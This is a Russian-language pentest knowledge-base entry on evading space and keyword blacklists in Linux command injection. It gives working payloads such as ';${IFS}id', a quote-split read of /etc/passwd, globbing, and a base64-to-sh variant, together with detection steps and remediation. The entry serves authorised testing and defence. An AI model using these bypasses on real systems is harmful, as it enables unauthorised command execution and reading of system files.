---
id: cmdi-filter-bypass-obfuscation
title: "Command injection: обход фильтра пробелов и blacklist-слов"
type: cmdi
target: linux
category: web
difficulty: advanced
bypass: filter
tags: [cmdi, bypass, obfuscation]
tested_on: ["bash"]
success_rate: 0.5
risk: high
cwe: "CWE-78"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Command_Injection"
graph:
  - target: "cmdi"
    type: instance_of
  - target: "waf-bypass"
    type: technique_of
---

# Command injection: обход фильтра пробелов и blacklist-слов

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
;${IFS}id
```

## Explanation

Пробелы часто фильтруют, но в bash `$IFS` содержит пробел/таб/перевод строки
и работает как разделитель аргументов. Другие приёмы:

- перенос строки `%0a` вместо `;`
- конкатенация без кавычек: `c"a"t /e"t"c/pas"s"wd`
- globbing: `/???/c?t /???/p?ss??`
- переменные: `a=id;$a`, `x=c;${x}at file`
- base64: `echo aWQ=|base64 -d|sh`
- замена blacklist-команд: `whoami` -> `id -un`, `cat` -> `od`, `head`, `rev`, `xxd`
- экранирование: `\i\d`

## Detection

Если `; id` блокируется, переберите: `;${IFS}id`, `%0aid`, `;i\d`, `;id;`.
Разное поведение на вариантах = blacklist-фильтр (обходим).

## Remediation

- Отказ от shell полностью (единственная надёжная мера).
- Whitelist допустимых значений параметров (например, только `^[a-z0-9-]{1,32}$`).
- Не полагаться на blacklist символов: список обходов практически бесконечен.
- Секомп/AppArmor-профиль для процесса: запрет execve для нецелевых бинарников.

## Variants

```
%0aid
```

```
;i\d
```

```
;c"a"t /etc/hosts
```

```
;echo aWQ=|base64 -d|sh
```
